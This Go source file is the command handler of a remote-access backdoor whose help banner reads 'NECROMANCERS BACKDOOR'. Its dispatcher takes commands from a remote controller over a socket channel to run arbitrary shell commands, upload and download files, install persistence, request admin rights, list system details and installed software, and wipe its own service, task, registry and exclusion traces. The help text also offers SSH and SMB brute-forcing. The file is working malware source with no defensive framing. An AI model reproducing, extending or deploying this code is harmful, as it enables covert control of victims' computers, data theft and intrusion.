package commands

import (
	"log"
	"sync"

	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/greatwhite/modules/agent"
	"github.com/whiterabb17/greatwhite/modules/install"
	"github.com/whiterabb17/greatwhite/modules/models"
	"github.com/whiterabb17/greatwhite/modules/roots"
	"github.com/whiterabb17/greatwhite/modules/util"
)

const (
	Help = "\t\t **NECROMANCERS BACKDOOR** \n\n" +
		" \t	*Basic Commands* \n" +
		"```help\t   - \tdisplay this help message\n" +
		"list\t   - \tdisplay currently open doors\n" +
		"ping\t   - \tmeasure the latency of command execution\n" +
		"reset\t  - \tcreate a new Summoning message\n" +
		"info\t   - \tdisplay system information\n" +
		"soft\t   - \tdisplay the list of installed programs\n" +
		"sh\t     - \texecute a command and return the output\n" +
		"up\t     - \tupload a file from the local system\n" +
		"dl\t     - \tdownload a file from a url to the local system\n" +
		"root\t   - \task for admin permissions\n" +
		"inst\t   - \treturns instance informtaion\n" +
		"brute\t  - \tperform bruteforcing against SSH or SMB\n" +
		"gryphon\t -\texecute gryphon [gCommand] w/out arguments\n" +
		"remove\t - \tuninstall Shaman bin & persistence``` \n\n"
	fmtUninstall = "```\nRemoving all traces of Shaman...\n\nService:   %v\nTask:      %v\nRegistry:  %v\nShortcut:  %v\n" +
		"Exclusion: %v\n\nBye!\n```"
	unknown = "[Err] Unknown Command"
)

/*
	func sendHelp(dg *discordgo.Session, message *discordgo.MessageCreate) {
		dg.ChannelMessageSend(message.ChannelID, Help)
		time.Sleep(1 * time.Second)
		dg.ChannelMessageSend(message.ChannelID, gHelp)
		time.Sleep(1 * time.Second)
		dg.ChannelMessageSend(message.ChannelID, gHelpB)
		time.Sleep(1 * time.Second)
		dg.ChannelMessageSend(message.ChannelID, gHelp2)
	}
*/
func Perform(c *gophersocket.Channel, cmd string, arguments []string, selfTag string) {
	defer util.Calm()
	if agent.DEBUG {
		log.Println("Command to Run: " + cmd)
		log.Println(arguments)
	}
	switch cmd {
	case "help":
		c.Emit("repl", models.Resp{Resp: GHelp, Tag: selfTag})
	case "ping":
		Ping(c, cmd, selfTag)
	case "persist":
		if !install.IsInstalled() {
			install.Install()
		}
	case "info":
		c.Emit("repl", models.Resp{Resp: Info(), Tag: selfTag})
	case "soft":
		Software(c, selfTag)
	case "root":
		Elevate(c, selfTag)
	case "dl":
		Download(arguments[0], c, selfTag)
	case "evolve":
		wgg := &sync.WaitGroup{}
		wgg.Add(1)
		roots.Regrowth(arguments[1], arguments[2], wgg)
		wgg.Wait()
	case "sh":
		var fullcmd string
		for _, c := range arguments {
			fullcmd += c + " "
		}
		Shell(fullcmd, c, selfTag)
	case "up":
		UploadFile(arguments[0], c, selfTag)
	case "inst":
		InstanceInfo(c, selfTag)
	case "remove":
		roots.Bury()
	default:
		c.Emit("error", models.Resp{Resp: "¯Unknown Command...\n\n" + Help, Tag: selfTag})
	}
	//}
}
